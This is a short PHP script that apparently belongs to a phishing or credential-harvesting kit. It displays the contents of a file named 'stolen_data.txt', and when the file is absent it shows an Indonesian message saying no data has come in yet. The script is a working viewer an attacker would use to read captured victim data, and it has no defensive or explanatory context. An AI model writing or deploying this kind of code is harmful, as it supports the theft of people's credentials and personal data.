<?php
$file = 'stolen_data.txt';
if(file_exists($file)) {
    echo "<pre>";
    echo file_get_contents($file);
    echo "</pre>";
} else {
    echo "Belum ada data yang masuk.";
}
?>